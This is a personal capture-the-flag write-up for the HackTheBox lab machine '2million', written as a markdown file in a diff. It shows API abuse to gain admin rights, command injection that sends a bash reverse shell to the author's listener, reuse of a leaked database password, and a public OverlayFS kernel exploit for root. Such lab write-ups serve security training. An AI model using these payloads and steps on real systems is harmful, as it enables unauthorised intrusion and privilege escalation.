@@ -1,1 +1,377 @@
+# 2 Million
 
+Target IP **10.10.11.221**
+
+┌─[eu-free-3]─[10.10.14.66]─[justdave@htb-ueennda6un]─[~]
+└──╼ [★]$ ip -br a
+lo               UNKNOWN        127.0.0.1/8 ::1/128
+ens3             UP             209.151.150.5/22 fe80::a4ba:3bff:fe08:5e25/64
+tun0             UNKNOWN        10.10.14.66/23 dead:beef:2::1040/64 fe80::bea:d07d:98d2:3755/64
+
+└──╼ [★]$ nmap -p- --min-rate 10000 10.10.11.221
+Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2025-06-21 07:21 CDT
+Nmap scan report for 10.10.11.221
+Host is up (0.078s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+└──╼ [★]$ nmap -sC -sV -Pn -p 22,80 10.10.11.221
+Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2025-06-21 07:29 CDT
+Nmap scan report for 10.10.11.221
+Host is up (0.076s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Did not follow redirect to http://2million.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+echo '10.10.11.221 2million.htb' | sudo tee -a /etc/hosts
+
+![image.png](attachment:67e681aa-dc28-4a2e-8895-e4fbfb0692c7:image.png)
+
+![image.png](attachment:65903a37-0fb1-4c0e-bddc-a8f3fb445dd1:image.png)
+
+```
+    $(document).ready(function() {
+        $('#verifyForm').submit(function(e) {
+            e.preventDefault();
+
+            var code = $('#code').val();
+            var formData = { "code": code };
+
+            $.ajax({
+                type: "POST",
+                dataType: "json",
+                data: formData,
+                **url: '/api/v1/invite/verify',**
+                success: function(response) {
+                    if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
+                        // Store the invite code in localStorage
+                        localStorage.setItem('inviteCode', code);
+
+                        window.location.href = '/register';
+                    } else {
+                        alert("Invalid invite code. Please try again.");
+                    }
+                },
+                error: function(response) {
+                    alert("An error occurred. Please try again.");
+                }
+            });
+        });
+    });
+
+```
+
+Checking the js on the console one sus thing shows up when i write make
+
+makeInvitecode()
+
+data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
+
+data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
+
+enctype: "ROT13"
+
+with cyberchef i got the result with the ROT13
+
+qngn: "In order to generate the invite code, make a POST request to /api/v1/invite/generate”
+
+└──╼ [★]$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq
+{
+"0": 200,
+"success": 1,
+"data": {
+"code": "TlNZUlItVkdDU0QtOFgyMDItV0JEOVU=",
+"format": "encoded"
+}
+}
+
+you can see that is base64 but with auto function with cyberchef it’ll do for you
+
+TlNZUlItVkdDU0QtOFgyMDItV0JEOVU → NSYRR-VGCSD-8X202-WBD9U
+
+the code is valid and you can register to the platform
+
+![image.png](attachment:be5530a5-a27d-4da1-baf7-bae563ee80c8:image.png)
+
+![image.png](attachment:ac165b69-41a4-4663-b786-bbb9ecd9e862:image.png)
+
+the only nice part is the one in Access that give the direction for vpn
+
+using burp to see what connection pack does
+
+```php
+GET /api/v1/user/vpn/generate HTTP/1.1
+Host: 2million.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://2million.htb/home/access
+DNT: 1
+Connection: keep-alive
+Cookie: PHPSESSID=v8kmsbufvcq4n4e6h0rj3ir2hj
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+```
+
+changing the GET /api/v1 HTTP/1.1 i get in response
+
+```php
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sat, 21 Jun 2025 13:01:05 GMT
+Content-Type: application/json
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 800
+
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+```
+
+[t](http://2million.htb/api/v1/admin/settings/update)he only 1 interesting to go to admin is admin settings update hoping to add myself
+
+thinking in json
+
+└──╼ [★]$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=v8kmsbufvcq4n4e6h0rj3ir2hj" --header "Content-Type: application/json" | jq
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+Dload  Upload   Total   Spent    Left  Speed
+100    56    0    56    0     0    353      0 --:--:-- --:--:-- --:--:--   354
+{
+"status": "danger",
+"message": "Missing parameter: email"
+}
+
+always missing something but it is ok we are getting closer 
+
+└──╼ [★]$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=v8kmsbufvcq4n4e6h0rj3ir2hj" --header "Content-Type: application/json" --data '{"[email":"iamacat@miao.it](mailto:email%22:%22iamacat@miao.it)"}' | jq
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+Dload  Upload   Total   Spent    Left  Speed
+100    86    0    59  100    27    382    174 --:--:-- --:--:-- --:--:--   558
+{
+"status": "danger",
+"message": "Missing parameter: is_admin"
+}
+
+finally got it
+
+└──╼ [★]$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=v8kmsbufvcq4n4e6h0rj3ir2hj" --header "Content-Type: application/json" --data '{"[email":"iamacat@miao.it](mailto:email%22:%22iamacat@miao.it)" , "is_admin": 1}' | jq
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+Dload  Upload   Total   Spent    Left  Speed
+100    86    0    43  100    43    275    275 --:--:-- --:--:-- --:--:--   554
+{
+"id": 15,
+"username": "iamacat",
+"is_admin": 1
+}
+
+ok now moving on
+
+testing things as a potential admin
+
+└──╼ [★]$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=v8kmsbufvcq4n4e6h0rj3ir2hj" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+└──╼ [★]$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=v8kmsbufvcq4n4e6h0rj3ir2hj" --header "Content-Type: application/json" --data '{"username":"test;whoami;"}'
+www-data
+
+ok on my system i stay and listen to 1234
+
+nc -lvp 1234
+
+while on the target i send the command to connect
+
+bash -i >& /dev/tcp/10.10.14.66/1234 0>&1
+
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=v8kmsbufvcq4n4e6h0rj3ir2hj" --header "Content-Type: application/json" --data '{"username":"test;bash -i >& /dev/tcp/10.10.14.66/1234 0>&1;"}'
+
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Ni8xMjM0IDA+JjE=
+
+url -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=v8kmsbufvcq4n4e6h0rj3ir2hj" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Ni8xMjM0IDA+JjE= | base64 -d | bash;"}'
+
+and got the shell - pwd in 
+
+/var/www/html
+
+in the php nothing interesting but
+
+www-data@2million:~/html$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+www-data@2million:~/html$ su - admin
+su - admin
+Password: SuperDuperPass123
+ls
+user.txt
+whoami
+admin
+
+i can  connect in ssh as a possible more stable shell.. 
+
+got the user flag, just under my nose
+
+on login with ssh i see that i have mail…let’s see
+
+admin@2million:~$ cd /var/mail
+admin@2million:/var/mail$ ls
+admin
+admin@2million:/var/mail$ cat admin
+From: ch4p [ch4p@2million.htb](mailto:ch4p@2million.htb)
+To: admin [admin@2million.htb](mailto:admin@2million.htb)
+Cc: g0blin [g0blin@2million.htb](mailto:g0blin@2million.htb)
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: [9876543210@2million.htb](mailto:9876543210@2million.htb)
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+
+probably a cve related to the os
+
+root@2million:/root# uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+
+root@2million:/root# lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 22.04.2 LTS
+Release:	22.04
+Codename:	jammy
+
+root@2million:/root# ldd --version
+ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
+Copyright (C) 2022 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+Written by Roland McGrath and Ulrich Drepper.
+
+cd /tmp
+
+git clone https://github.com/xkaneiki/CVE-2023-0386
+
+cd /tmp/CVE-2023-0386/
+make all
+
+admin@2million:/tmp/CVE-2023-0386$ ./exp
+uid:1000 gid:1000
+[+] mount success
+total 24
+drwxrwxr-x 1 root   root     4096 Jun 21 16:43 .
+drwxrwxr-x 6 root   root     4096 Jun 21 18:10 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jun 21 16:43 file
+[+] exploit success!
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details
+
+i am root
+
+fun, not so much for me, fact there is a thank you.json
+
+{"encoding": "url", "data":
+"%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786
+f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f6469
+6e67223a2022626173653634222c202264617461223a20224441514347585167424345454c4341454951517
+3534359744168553944776f664c5552765344676461414152446e5163445441474643514542307367423055
+6a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685
+a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c4241
+30594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e5
+27741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d30685859
+6749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524
+a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b675147
+42585159436a456345536f4e426b736a41524571414130385151594b4e77424649774563614151564469595
+2525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e416973
+4246694550424564304941516842437767424345454c45674e497878594b6751474258514b4543734444476
+7554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c487931424541
+4d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e525
+16f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454
+776774457841454f676b4a596734574c4545544754734f41444563455363504167643044786374474177675
+4304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f
+4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a67455
+44a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e774246495163
+5a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b77456461414
+94d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a
+424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a6363444
+4514b57434550467734344241776c4368597242454d6650416b5259676b4e4c513051537941414444465044
+69454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454
+651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135
+425241734267777854554d6650416b4c4b5538424a785244445473615253414b45535947517770304741517
+74731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e6863
+3945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454
+d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441
+454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497
+873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f
+424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b474
+43351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a6342
+46534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e446964494843636
+25744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a50477941
+4145783878476b6c694742417445775a4c497731464e5159554a45454142446f63444377614857675644457
+36b485259715477776742454d4a4f78304c4a67344b49515151537a734f5253455747693054454134334852
+63724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b3148417774415
+6676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41
+454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a6944687372424241595
+0516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b49414552
+4e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
+
+url decode → base 64 + xor utf8 with HackTheBox key to see the note
+
+Dear HackTheBox Community,
+
+We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.
+
+From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.
+
+To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.
+
+Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.
+
+With deepest gratitude,
+
+The HackTheBox Team
